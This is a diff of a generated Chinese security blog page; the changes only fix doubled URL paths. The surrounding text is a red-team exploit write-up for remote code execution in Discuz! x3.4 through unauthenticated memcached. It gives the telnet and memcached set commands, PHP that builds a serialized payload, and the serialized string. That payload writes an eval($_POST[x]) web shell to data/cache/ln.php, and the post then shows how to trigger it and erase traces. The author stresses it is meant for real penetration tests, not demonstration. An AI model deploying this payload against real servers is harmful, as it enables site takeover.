@@ -228,7 +228,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/02/26/Discuz-因memcached未授权访问导致的RCE/Discuz-因memcached未授权访问导致的RCE/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/02/26/Discuz-因memcached未授权访问导致的RCE/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="John Doe">
@@ -247,7 +247,7 @@
         
           <h2 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/02/26/Discuz-因memcached未授权访问导致的RCE/Discuz-因memcached未授权访问导致的RCE/" itemprop="url">Discuz!因memcached未授权访问导致的RCE</a></h2>
+                <a class="post-title-link" href="/2018/02/26/Discuz-因memcached未授权访问导致的RCE/" itemprop="url">Discuz!因memcached未授权访问导致的RCE</a></h2>
         
 
         <div class="post-meta">
@@ -333,13 +333,13 @@
 <p>漏洞利用代码流程逻辑：</p>
 <p>访问：forum.php?mod=ajax&amp;inajax=yes&amp;action=getthreadtypes</p>
 <p>./source/module/forum/forum_ajax.php</p>
-<p><img src="/2018/02/26/Discuz-因memcached未授权访问导致的RCE/Discuz-因memcached未授权访问导致的RCE/./1.jpg" alt="1"></p>
+<p><img src="/2018/02/26/Discuz-因memcached未授权访问导致的RCE/1.jpg" alt="1"></p>
 <p>./template/default/common/footer_ajax.htm</p>
-<p><img src="/2018/02/26/Discuz-因memcached未授权访问导致的RCE/Discuz-因memcached未授权访问导致的RCE/./2.png" alt="2"></p>
+<p><img src="/2018/02/26/Discuz-因memcached未授权访问导致的RCE/2.png" alt="2"></p>
 <p>./source/function/function_core.php</p>
-<p><img src="/2018/02/26/Discuz-因memcached未授权访问导致的RCE/Discuz-因memcached未授权访问导致的RCE/./3.png" alt="3"></p>
+<p><img src="/2018/02/26/Discuz-因memcached未授权访问导致的RCE/3.png" alt="3"></p>
 <p>./source/function/function_core.php</p>
-<p><img src="/2018/02/26/Discuz-因memcached未授权访问导致的RCE/Discuz-因memcached未授权访问导致的RCE/./4.png" alt="img"></p>
+<p><img src="/2018/02/26/Discuz-因memcached未授权访问导致的RCE/4.png" alt="img"></p>
 <p>最后利用preg_replace函数/e参数的代码执行特性完成了漏洞利用的全部过程。</p>
 <p>以上是老版本代码，在网上已经有一些分析了，在这里简述一些，重点是payload的完整性使用。网上文章大部分在payload部分都只是验证性演示。作为一名红队渗透测试人员，验证性payload肯定是不能再实际渗透测试活动中使用的。</p>
 <p><strong>四、漏洞利用流程</strong></p>
@@ -353,7 +353,7 @@
 <p>​    然后telnet链接memcached</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 1.1.1.1 11211</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set xxxxxx_setting 1 0 yyy    //xxxx为前缀，discuz定义的，可以使用stats cachedump 命令查看。yyy为payload长度。</span><br></pre></td></tr></table></figure>
-<p><img src="/2018/02/26/Discuz-因memcached未授权访问导致的RCE/Discuz-因memcached未授权访问导致的RCE/./5.png" alt="img"></p>
+<p><img src="/2018/02/26/Discuz-因memcached未授权访问导致的RCE/5.png" alt="img"></p>
 <p>最后访问forum.php?mod=ajax&amp;inajax=yes&amp;action=getthreadtypes，shell生成/data/cache/ln.php。</p>
 <ol>
 <li>网上给的修复代码，完全没有作用</li>
@@ -361,14 +361,14 @@
 <p>​        网上大部分修复是这样的 <a href="https://yq.aliyun.com/ziliao/5533" target="_blank" rel="noopener">https://yq.aliyun.com/ziliao/5533</a>。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"(/|#|\+|%).*(/|#|\+|%)e"</span>, $_G[<span class="string">'setting'</span>][<span class="string">'output'</span>][<span class="string">'preg'</span>][<span class="string">'search'</span>]) !== <span class="keyword">FALSE</span>) &#123; <span class="keyword">die</span>(<span class="string">"request error"</span>); &#125;</span><br></pre></td></tr></table></figure>
 <p>​    这个修复完全没有作用，无效修复，preg_match的正则根本匹配不到/.*/e。注意看，正则代码没有给分隔符，而(成了分隔符，让正则失去了本来的作用，如果加上分隔符，正则匹配任何字符，将影响代码正常功能。</p>
-<p><img src="/2018/02/26/Discuz-因memcached未授权访问导致的RCE/Discuz-因memcached未授权访问导致的RCE/./11.png" alt="img"></p>
+<p><img src="/2018/02/26/Discuz-因memcached未授权访问导致的RCE/11.png" alt="img"></p>
 <p><strong>五、最新版本Discuz x3.4漏洞依旧存在</strong></p>
 <ol>
 <li><p>代码变化，漏洞依旧</p>
 <p>​漏洞点代码已经被更新，但是漏洞并没有被修复，这种代码更新应该是为了适应php版本更新，因为php5.5以后preg_replace的/e参数被废弃，官方建议使用preg_replace_callback。</p>
 </li>
 </ol>
-<p><img src="/2018/02/26/Discuz-因memcached未授权访问导致的RCE/Discuz-因memcached未授权访问导致的RCE/./6.png" alt="img"></p>
+<p><img src="/2018/02/26/Discuz-因memcached未授权访问导致的RCE/6.png" alt="img"></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($_G[<span class="string">'setting'</span>][<span class="string">'output'</span>][<span class="string">'preg'</span>][<span class="string">'search'</span>]<span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">$content= preg_replace_callback($value, create_function(<span class="string">'$matches'</span>,<span class="string">'return'</span>.$_G[<span class="string">'setting'</span>][<span class="string">'output'</span>][<span class="string">'preg'</span>][<span class="string">'replace'</span>][$key].<span class="string">';'</span>), $content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>漏洞函数变成了create_function,这个函数大家都知道也是危险函数，可以造成代码执行漏洞。</p>
 <ol>
@@ -377,16 +377,16 @@
 <p>生成payload有点变化(ps:只是少了一个e)</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$payload[<span class="string">'output'</span>][<span class="string">'preg'</span>][<span class="string">'search'</span>][<span class="string">'plugins'</span>]= <span class="string">"/.*/"</span>;</span><br><span class="line">$payload[<span class="string">'output'</span>][<span class="string">'preg'</span>][<span class="string">'replace'</span>][<span class="string">'plugins'</span>]= <span class="string">"file_put_contents('./data/cache/ln.php','&lt;?phpeval(\$_POST[x]);?&gt;');"</span>;</span><br><span class="line">$payload[<span class="string">'rewritestatus'</span>][<span class="string">'plugins'</span>]= <span class="number">1</span>;</span><br><span class="line">echoserialize($payload);</span><br></pre></td></tr></table></figure>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:6:"output";a:1:&#123;s:4:"preg";a:2:&#123;s:6:"search";a:1:&#123;s:7:"plugins";s:4:"/.*/";&#125;s:7:"replace";a:1:&#123;s:7:"plugins";s:68:"file_put_contents('./data/cache/ln.php','&lt;?phpeval($_POST[x]);?&gt;');";&#125;&#125;&#125;s:13:"rewritestatus";a:1:&#123;s:7:"plugins";i:1;&#125;&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="/2018/02/26/Discuz-因memcached未授权访问导致的RCE/Discuz-因memcached未授权访问导致的RCE/./7.png" alt="img"></p>
+<p><img src="/2018/02/26/Discuz-因memcached未授权访问导致的RCE/7.png" alt="img"></p>
 <p>访问:forum.php?mod=ajax&amp;inajax=yes&amp;action=getthreadtypes</p>
-<p><img src="/2018/02/26/Discuz-因memcached未授权访问导致的RCE/Discuz-因memcached未授权访问导致的RCE/./8.png" alt="img"></p>
+<p><img src="/2018/02/26/Discuz-因memcached未授权访问导致的RCE/8.png" alt="img"></p>
 <p>最后一定要恢复缓存</p>
 <p>Delete Vtfbsm_setting</p>
 <p>成功写入文件</p>
-<p><img src="/2018/02/26/Discuz-因memcached未授权访问导致的RCE/Discuz-因memcached未授权访问导致的RCE/./9.png" alt="img"></p>
+<p><img src="/2018/02/26/Discuz-因memcached未授权访问导致的RCE/9.png" alt="img"></p>
 <p><strong>四、总结</strong></p>
 <p>​    直到最新版本discuz也没有修复这个漏洞，当初的ssrf结合memcached的漏洞，discuz只看到了ssrf漏洞，并没有留意到这个代码执行的漏洞。通过漏洞的抽象思维，我们知道控制memcached的方式不仅仅只有ssrf，再进一步到代码层，控制$G全局变量的方式也不仅仅只有memcached。</p>
-<p><img src="/2018/02/26/Discuz-因memcached未授权访问导致的RCE/Discuz-因memcached未授权访问导致的RCE/./10.png" alt="img"></p>
+<p><img src="/2018/02/26/Discuz-因memcached未授权访问导致的RCE/10.png" alt="img"></p>
 
           
         
